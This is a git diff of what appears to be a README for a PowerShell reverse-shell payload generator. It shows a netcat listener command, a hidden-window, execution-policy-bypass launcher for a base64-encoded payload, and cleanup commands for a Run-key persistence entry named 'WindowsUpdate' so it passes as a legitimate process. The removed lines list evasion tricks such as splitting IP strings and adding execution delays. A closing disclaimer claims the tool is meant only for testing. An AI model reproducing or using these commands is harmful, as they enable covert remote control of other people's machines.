@@ -69,14 +69,18 @@ nc -nvlp 2222
 
 ## Example Output
 ```powershell
-powershell -nop -w 1 -ep bypass -e JABJAFQAPQAnADE...
+Start-Process powershell -ArgumentList "-ep bypass -e {b64_final}" -WindowStyle Hidden
 ```
+## reverse shell termination
+```powershell
+# Remove registry entry
+Remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name WindowsUpdate
 
-## Customization Options
-- Split IP address strings (e.g., `'192.168'+'.1.100'`)
-- Add junk code between script blocks
-- Modify the PS> prompt pattern
-- Implement time-based execution delays
+# Kill active sessions
+Get-CimInstance Win32_Process | Where-Object { 
+    $_.CommandLine -like "*WindowsUpdate*" 
+} | Stop-Process -Force
+```
 
 ## Important Notes
 - Always test payloads in controlled environments
@@ -90,4 +94,6 @@ This tool is intended for:
 - Educational purposes
 - Security research
 
-Always obtain proper authorization before using this tool against any network or system.
+```powershell
+Always obtain proper authorization before using this tool against any network or system. I ethixlucifer is not liable for any discripent use of this tool. I purely built it for the testing purpose with no intention to be used in a production / real-world scenario.
+```
